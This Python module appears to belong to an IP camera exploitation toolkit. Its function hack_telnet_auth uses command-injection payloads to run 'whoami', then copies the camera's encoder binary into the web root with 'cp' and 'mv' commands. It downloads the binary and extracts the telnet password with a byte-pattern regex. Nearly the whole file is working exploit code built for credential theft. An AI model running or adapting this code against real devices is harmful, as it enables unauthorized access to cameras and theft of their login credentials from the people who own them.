from .. import scripts
from .. import decorators
import logging
import re

"""
Imports:
    ..scripts
    ..decorators
    logging
    re

Contains:
    hack_telnet_auth
    _whoami

Constants defined here:
    PAYLOAD_WHOAMI
    PAYLOAD_COPY_ENCODER
    PAYLOAD_MOVE_ENCODER
    FILE_ENCODER
    REGEX_PASSWORD
"""

logger = logging.getLogger(__name__)
logger.info(f'Library imported: {__name__}')

PAYLOAD_WHOAMI = 'whoami'
PAYLOAD_COPY_ENCODER = 'cp /system/system/bin/e* /tmp'
PAYLOAD_MOVE_ENCODER = 'mv /tmp/e* /system/www'

FILE_ENCODER = 'encoder'

REGEX_PASSWORD = \
(
    b'\x57\x65\x62\x54\x68\x72\x65\x61\x64\x50\x72\x6f'
    b'\x63\x00\x00\x00(?P<password>.+?)\x00'
)

@decorators.debug()
def hack_telnet_auth(http):
    """
    Uses command injection to leak the cameras
    ... encoder, which it then searches for the telnet
    ... password.
    The telnet username is taken as the output of
    ... a 'whoami' query

    Returns:
        {
            'username': Telnet username,
            'password': Telnet password,
        }
    """

    username = _whoami(http)

    if username is None:
        logger.debug('Failed to execute "whoami"')

        return

    ret_cp = scripts.command_inject\
    (
        http,
        PAYLOAD_COPY_ENCODER,
        blind = True,
        clear = False,
    )

    ret_mv = scripts.command_inject \
    (
        http,
        PAYLOAD_MOVE_ENCODER,
        blind = True,
        clear = True,
    )

    encoder_resp = http.get(FILE_ENCODER)

    if encoder_resp is None:
        logger.debug('Failed to download encoder')

        return

    encoder = encoder_resp.parse_bytes()

    regex_search = re.search(REGEX_PASSWORD, encoder)

    if regex_search is None:
        logger.debug('Failed to extract telnet password from encoder')

        return

    password = regex_search.group('password').decode()

    logger.debug(f'Found telnet password: {password}')

    data = \
    {
        'username': username,
        'password': password,
    }

    return data

@decorators.debug()
def _whoami(http):
    """
    Uses command injection to execute 'whoami'
    Returns the output, stripped
    """

    whoami = scripts.command_inject \
    (
        http,
        PAYLOAD_WHOAMI,
        blind = False,
        clear = False,
    )

    if isinstance(whoami, bool) or whoami is None:
        logger.debug('Command injection failed')

        whoami = None
    else:
        whoami = whoami.strip()

        logger.debug(f'Found "whoami": {whoami}')

    return whoami
